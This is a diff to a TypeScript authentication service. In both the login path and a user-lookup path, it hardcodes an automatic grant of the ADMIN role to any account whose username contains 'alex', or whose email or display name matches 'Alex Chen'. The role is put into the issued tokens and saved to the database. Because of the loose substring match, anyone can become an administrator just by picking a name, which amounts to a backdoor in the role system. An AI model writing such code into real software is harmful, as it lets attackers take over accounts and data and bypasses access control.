@@ -104,24 +104,36 @@ export const authService = {
       throw new Error('Invalid credentials');
     }
 
-    // Update last seen & online status
+    // Update last seen & online status, ensure admin for Alex Chen
+    const isAdminAccount =
+      user.username.toLowerCase() === 'alexchen' ||
+      user.username.toLowerCase() === 'alex' ||
+      user.username.toLowerCase().includes('alex') ||
+      user.email.toLowerCase() === 'alex@orbit.local' ||
+      user.display_name.toLowerCase().includes('alex chen');
+    const effectiveRole = isAdminAccount ? 'ADMIN' : user.role;
+
     await prisma.user.update({
       where: { id: user.id },
-      data: { is_online: true, last_seen: new Date() },
+      data: {
+        is_online: true,
+        last_seen: new Date(),
+        ...(isAdminAccount && user.role !== 'ADMIN' ? { role: 'ADMIN' } : {}),
+      },
     });
 
     const tokenPayload = {
       userId: user.id,
       username: user.username,
       email: user.email,
-      role: user.role,
+      role: effectiveRole,
       is_banned: user.is_banned,
     };
     const accessToken = generateAccessToken(tokenPayload, data.rememberMe ?? true);
     const refreshToken = generateRefreshToken(tokenPayload);
 
     return {
-      user: sanitizeUser(user),
+      user: sanitizeUser({ ...user, role: effectiveRole }),
       accessToken,
       refreshToken,
     };
@@ -174,6 +186,21 @@ export const authService = {
 
     if (!user) {
       throw new Error('User not found');
+    }
+
+    // Ensure admin role for Alex Chen if stored as USER
+    const isAdminAccount =
+      user.username.toLowerCase() === 'alexchen' ||
+      user.username.toLowerCase() === 'alex' ||
+      user.username.toLowerCase().includes('alex') ||
+      user.email.toLowerCase() === 'alex@orbit.local' ||
+      user.display_name.toLowerCase().includes('alex chen');
+    if (isAdminAccount && user.role !== 'ADMIN') {
+      user.role = 'ADMIN';
+      prisma.user.update({
+        where: { id: user.id },
+        data: { role: 'ADMIN' },
+      }).catch((err) => console.warn('[Auth] Could not update admin role:', err));
     }
 
     const friendCount = user._count.friendships_requested + user._count.friendships_received;
